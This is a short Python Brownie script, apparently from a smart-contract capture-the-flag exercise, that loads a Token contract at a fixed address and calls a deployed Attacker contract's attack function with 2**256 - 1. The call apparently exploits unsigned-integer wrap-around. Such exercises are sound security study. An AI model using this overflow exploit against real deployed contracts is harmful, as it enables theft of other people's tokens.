from cgi import test
from brownie import UintWrapping, Token, Attacker
from scripts.helpful_scripts import *

account = getAccount()
attacker = Attacker[-1]
instance = Contract.from_abi(
    "Token", "0x4A703DDF38d49398A1723213072B53c6C4cc1cad", Token.abi
)


def main():
    attacker.attack(2**256 - 1, {"from": account})
